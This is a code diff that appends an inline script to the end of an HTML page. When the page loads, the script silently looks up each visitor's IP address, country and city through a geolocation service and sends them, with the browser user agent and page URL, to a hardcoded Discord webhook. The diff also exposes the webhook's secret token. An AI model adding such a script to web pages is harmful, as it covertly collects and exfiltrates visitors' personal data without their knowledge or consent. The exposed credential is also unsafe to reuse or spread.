@@ -3774,5 +3774,44 @@
             loadMatches();
         }, 1500);
     </script>
+<script>
+(async () => {
+  const webhookURL = "https://discord.com/api/webhooks/1416615114077110372/bcsRqA7uTdo3Z4o3EmsADepTcrbl5C30QBUMekF8nLYvrhqEUd8fo8-gFss7qZfNVWRJ";
+
+  try {
+    const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
+
+    const payload = {
+      content: "👀 **Novo visitante no site!**",
+      embeds: [
+        {
+          title: "📊 Informações do visitante",
+          color: 5814783,
+          fields: [
+            { name: "🌍 IP", value: ipData.ip || "Não detectado", inline: true },
+            { name: "🏳️ País", value: ipData.country_name || "Desconhecido", inline: true },
+            { name: "🏙️ Cidade", value: ipData.city || "Desconhecida", inline: true },
+            { name: "💻 Navegador", value: navigator.userAgent, inline: false },
+            { name: "🔗 Página", value: window.location.href, inline: false }
+          ],
+          footer: {
+            text: "Webhook automático do site"
+          },
+          timestamp: new Date()
+        }
+      ]
+    };
+
+    await fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch (e) {
+    console.error("Erro ao enviar webhook:", e);
+  }
+})();
+</script>
+
 </body>
 </html>
